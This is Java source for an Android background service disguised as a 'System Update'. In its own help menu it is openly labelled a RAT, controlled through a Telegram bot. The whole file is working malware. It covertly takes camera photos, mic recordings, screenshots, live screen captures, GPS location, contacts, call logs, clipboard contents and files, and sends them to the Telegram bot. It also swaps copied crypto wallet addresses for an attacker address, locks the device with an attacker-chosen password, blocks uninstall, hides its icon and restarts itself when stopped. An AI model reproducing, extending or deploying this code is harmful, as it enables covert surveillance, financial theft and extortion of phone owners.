package com.sys.updater;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioAttributes;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.widget.Toast;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;

public class TelegramService extends Service {
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private boolean isVncRunning = false;
    private boolean isFlashOn = false;
    private MediaPlayer sirenPlayer;
    private MediaPlayer audioPlayer;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    // HNA 7ET ADDRESS DYAL CRYPTO
    private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";

    @Override
    public void onCreate() {
        super.onCreate();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "sys")
                    .setContentTitle("System Update")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notification);
            }
        }
        
        Exfil.send("✅ System Bot is Online.\nType /help or /menu to see all commands.");
        new Thread(this::pollTelegram).start();
        
        blockUninstall();
    }

    private void blockUninstall() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.setUninstallBlocked(admin, getPackageName(), true);
                Exfil.send("🛡️ Anti-Uninstall Shield Activated.");
            }
        } catch (Exception e) {}
    }

    private void pollTelegram() {
        while (isRunning) {
            try {
                String urlStr = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                InputStream is = new URL(urlStr).openStream();
                java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                String response = s.hasNext() ? s.next() : "";
                
                JSONObject json = new JSONObject(response);
                if (json.getBoolean("ok")) {
                    JSONArray result = json.getJSONArray("result");
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        if (update.has("message")) {
                            String text = update.getJSONObject("message").optString("text", "");
                            handleCommand(text);
                        }
                    }
                }
                Thread.sleep(2000);
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void handleCommand(final String cmd) {
        mainHandler.post(() -> {
            if (cmd.equals("/help") || cmd.equals("/menu")) {
                sendHelpMenu();
            }
            else if (cmd.equals("/flash")) toggleFlashlight();
            else if (cmd.equals("/siren")) playSiren();
            else if (cmd.startsWith("/playaudio ")) playAudio(cmd.substring(11).trim());
            else if (cmd.equals("/stopaudio")) {
                stopAudio();
                Exfil.send("⏹️ Audio Stopped.");
            }
            else if (cmd.startsWith("/wallpaper ")) changeWallpaper(cmd.substring(11).trim());
            else if (cmd.startsWith("/open ")) openUrl(cmd.substring(6).trim());
            else if (cmd.equals("/vibrate")) vibrateDevice();
            else if (cmd.startsWith("/toast ")) showToast(cmd.substring(7).trim());
            else if (cmd.startsWith("/lock ")) lockDevice(cmd.substring(6).trim());
            else if (cmd.equals("/unlock")) unlockDevice();
            else if (cmd.equals("/cam")) takePhoto();
            else if (cmd.equals("/mic")) recordAudio();
            else if (cmd.equals("/screenshot")) { if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen(); }
            else if (cmd.equals("/loc")) getLocation();
            else if (cmd.equals("/files")) listFiles();
            else if (cmd.startsWith("/get ")) Exfil.sendFile(cmd.substring(5).trim(), "Document", "File");
            else if (cmd.equals("/hide")) hideIcon();
            else if (cmd.equals("/contacts")) getContacts();
            else if (cmd.equals("/calls")) getCallLogs();
            else if (cmd.equals("/clip")) getClipboard();
            else if (cmd.equals("/vnc")) {
                isVncRunning = !isVncRunning;
                Exfil.send(isVncRunning ? "🖥️ VNC Stream Started" : "🖥️ VNC Stream Stopped");
                if (isVncRunning) startVncStream();
            }
            else if (cmd.equals("/cryptoclip")) startCryptoClipboardHijack();
            else if (cmd.equals("/apps")) getInstalledApps();
            else if (cmd.startsWith("/uninstall ")) uninstallApp(cmd.substring(11).trim());
            else if (cmd.equals("/restart")) {
                startService(new Intent(this, TelegramService.class));
                Exfil.send("🔄 Service Restarted.");
            }
        });
    }

    private void sendHelpMenu() {
        String menu = "🤖 **Available Commands:**\n\n" +
                "**FUN PANEL:**\n" +
                "/flash - Toggle Flashlight\n" +
                "/siren - Play/Stop Siren\n" +
                "/playaudio <url/path> - Play MP3/M4A\n" +
                "/stopaudio - Stop Audio\n" +
                "/wallpaper <url/path> - Change Wallpaper\n" +
                "/open <url> - Open URL in browser\n" +
                "/vibrate - Vibrate device\n" +
                "/toast <msg> - Show toast message\n" +
                "/lock <pass> - Lock device with password\n" +
                "/unlock - Remove password\n\n" +
                "**RAT:**\n" +
                "/cam - Take front camera photo\n" +
                "/mic - Record 10s audio\n" +
                "/screenshot - Take screenshot\n" +
                "/loc - Get GPS location\n" +
                "/files - List files in /sdcard/Download\n" +
                "/get <path> - Download specific file\n" +
                "/hide - Hide app icon\n" +
                "/contacts - Get contacts\n" +
                "/calls - Get call logs\n" +
                "/clip - Get clipboard\n" +
                "/vnc - Toggle Live screen streaming\n" +
                "/cryptoclip - Hijack crypto clipboard\n" +
                "/apps - List installed apps\n" +
                "/uninstall <pkg> - Uninstall app\n" +
                "/restart - Restart the bot";
        Exfil.send(menu);
    }

    // ================== FUN PANEL FEATURES ==================

    private void playAudio(String pathOrUrl) {
        try {
            stopAudio();
            audioPlayer = new MediaPlayer();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                audioPlayer.setAudioAttributes(new AudioAttributes.Builder()
                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .build());
            }

            if (pathOrUrl.startsWith("http://") || pathOrUrl.startsWith("https://")) {
                audioPlayer.setDataSource(pathOrUrl);
            } else {
                File file = new File(pathOrUrl);
                if (!file.exists()) {
                    Exfil.send("❌ File not found: " + pathOrUrl);
                    return;
                }
                audioPlayer.setDataSource(file.getAbsolutePath());
            }

            audioPlayer.setOnPreparedListener(mp -> {
                mp.start();
                Exfil.send("🎵 Playing Audio: " + pathOrUrl);
            });

            audioPlayer.setOnCompletionListener(mp -> {
                stopAudio();
                Exfil.send("🎵 Audio Finished.");
            });

            audioPlayer.setOnErrorListener((mp, what, extra) -> {
                Exfil.send("❌ Audio Error: " + what + " - " + extra);
                stopAudio();
                return true;
            });

            audioPlayer.prepareAsync();
        } catch (Exception e) {
            Exfil.send("❌ Play Audio Exception: " + e.getMessage());
        }
    }

    private void stopAudio() {
        try {
            if (audioPlayer != null) {
                if (audioPlayer.isPlaying()) {
                    audioPlayer.stop();
                }
                audioPlayer.release();
                audioPlayer = null;
            }
        } catch (Exception e) {}
    }

    private void toggleFlashlight() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            isFlashOn = !isFlashOn;
            manager.setTorchMode(cameraId, isFlashOn);
            Exfil.send(isFlashOn ? "🔦 Flashlight ON" : "🔦 Flashlight OFF");
        } catch (Exception e) {
            Exfil.send("Flash Error: " + e.getMessage());
        }
    }

    private void playSiren() {
        try {
            if (sirenPlayer != null && sirenPlayer.isPlaying()) {
                sirenPlayer.stop();
                sirenPlayer.release();
                Exfil.send("🔊 Siren Stopped.");
                return;
            }
            sirenPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
            if (sirenPlayer == null) sirenPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
            if (sirenPlayer != null) {
                sirenPlayer.setLooping(true);
                sirenPlayer.start();
                Exfil.send("🔊 Siren Started (Send /siren again to stop).");
            }
        } catch (Exception e) {
            Exfil.send("Siren Error: " + e.getMessage());
        }
    }

    private void changeWallpaper(String pathOrUrl) {
        new Thread(() -> {
            try {
                Bitmap myBitmap = null;
                if (pathOrUrl.startsWith("/") || pathOrUrl.startsWith("file://")) {
                    String filePath = pathOrUrl.replace("file://", "");
                    File file = new File(filePath);
                    if (!file.exists()) {
                        Exfil.send("❌ File not found: " + filePath);
                        return;
                    }
                    myBitmap = BitmapFactory.decodeFile(filePath);
                } else {
                    URL url = new URL(pathOrUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                    connection.setDoInput(true);
                    connection.connect();
                    myBitmap = BitmapFactory.decodeStream(connection.getInputStream());
                }
                
                if (myBitmap == null) {
                    Exfil.send("❌ Failed to decode image.");
                    return;
                }
                
                WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
                wallpaperManager.setBitmap(myBitmap);
                Exfil.send("🖼️ Wallpaper Changed Successfully!");
            } catch (SecurityException e) {
                Exfil.send("❌ Missing SET_WALLPAPER permission in Manifest!");
            } catch (Exception e) {
                Exfil.send("❌ Wallpaper Error: " + e.getMessage());
            }
        }).start();
    }

    private void openUrl(String urlStr) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(urlStr));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Exfil.send("🌐 Opened URL: " + urlStr);
        } catch (Exception e) {
            Exfil.send("Open URL Error: " + e.getMessage());
        }
    }

    private void vibrateDevice() {
        try {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(5000);
                }
                Exfil.send("📳 Device Vibrating.");
            }
        } catch (Exception e) {}
    }

    private void showToast(String msg) {
        try {
            Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();
            Exfil.send("💬 Toast Shown: " + msg);
        } catch (Exception e) {}
    }

    private void lockDevice(String password) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.resetPassword(password, 0);
                dpm.lockNow();
                Exfil.send("🔒 Device Locked with password: " + password);
            } else {
                Exfil.send("❌ Device Admin not active.");
            }
        } catch (Exception e) {
            Exfil.send("Lock Error: " + e.getMessage());
        }
    }

    private void unlockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.resetPassword("", 0);
                Exfil.send("🔓 Device Password Removed.");
            }
        } catch (Exception e) {
            Exfil.send("Unlock Error: " + e.getMessage());
        }
    }

    // ================== RAT FEATURES ==================

    private void hideIcon() {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_LAUNCHER);
            intent.setPackage(getPackageName());
            List<ResolveInfo> activities = getPackageManager().queryIntentActivities(intent, 0);
            if (activities.size() > 0) {
                String activityName = activities.get(0).activityInfo.name;
                ComponentName componentName = new ComponentName(getPackageName(), activityName);
                getPackageManager().setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                Exfil.send("🕵️ Icon hidden for: " + getPackageName());
            }
        } catch (Exception e) {}
    }

    private void uninstallApp(String packageName) {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Exfil.send("🗑️ Uninstall prompt opened.");
        } catch (Exception e) {}
    }

    private void startVncStream() {
        if (!isVncRunning) return;
        if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreenSilent();
        mainHandler.postDelayed(this::startVncStream, 3000);
    }

    private void startCryptoClipboardHijack() {
        Exfil.send("💰 Crypto Clipboard Hijack Started.");
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboard.addPrimaryClipChangedListener(() -> {
            try {
                if (clipboard.hasPrimaryClip()) {
                    String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
                    if (text.startsWith("0x") && text.length() > 30) {
                        ClipData clip = ClipData.newPlainText("text", ATTACKER_CRYPTO_ADDRESS);
                        clipboard.setPrimaryClip(clip);
                        Exfil.send("💸 Hijacked Crypto Address!");
                    }
                }
            } catch (Exception e) {}
        });
    }

    private void getInstalledApps() {
        StringBuilder sb = new StringBuilder("📱 Installed Apps:\n\n");
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo app : apps) {
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                sb.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
            }
        }
        Exfil.send(sb.toString());
    }

    private void getContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("👥 Contacts:\n\n");
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 50) {
                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void getCallLogs() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("📞 Last Calls:\n\n");
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void getClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) {
                Exfil.send("📋 Clipboard:\n" + clipboard.getPrimaryClip().getItemAt(0).getText().toString());
            } else {
                Exfil.send("📋 Clipboard is empty.");
            }
        } catch (Exception e) {}
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                Exfil.send("📍 Location:\nhttps://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude());
            } else {
                Exfil.send("❌ Location not available.");
            }
        } catch (Exception e) {}
    }

    private void listFiles() {
        try {
            File dir = new File("/sdcard/Download");
            if (!dir.exists()) dir = new File("/sdcard/");
            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder("📁 Files in " + dir.getAbsolutePath() + ":\n\n");
            if (files != null) {
                for (int i = 0; i < Math.min(files.length, 30); i++) sb.append(files[i].getName()).append("\n");
                sb.append("\nUse `/get ").append(dir.getAbsolutePath()).append("/filename` to download.");
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void takePhoto() {
        Exfil.send("📷 Opening Camera...");
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1];
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(reader.getSurface());
                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                        try { session.capture(builder.build(), null, null); } catch (Exception e) {}
                                    }, 1000);
                                    reader.setOnImageAvailableListener(r -> {
                                        Image image = r.acquireLatestImage();
                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                        byte[] bytes = new byte[buffer.remaining()];
                                        buffer.get(bytes);
                                        try {
                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
                                            FileOutputStream fos = new FileOutputStream(f);
                                            fos.write(bytes); fos.close();
                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
                                        } catch (Exception e) {}
                                        image.close(); camera.close();
                                    }, null);
                                } catch (Exception e) {}
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
                        }, null);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) {}
            }, null);
        } catch (Exception e) {}
    }

    private void recordAudio() {
        try {
            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare(); recorder.start();
            Exfil.send("🎙️ Recording 10s...");
            new Thread(() -> {
                try { Thread.sleep(10000); } catch (Exception e) {}
                mainHandler.post(() -> {
                    try {
                        recorder.stop(); recorder.release();
                        Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record");
                    } catch (Exception e) {}
                });
            }).start();
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Intent restartService = new Intent(getApplicationContext(), TelegramService.class);
        restartService.setPackage(getPackageName());
        startService(restartService);
    }
                }
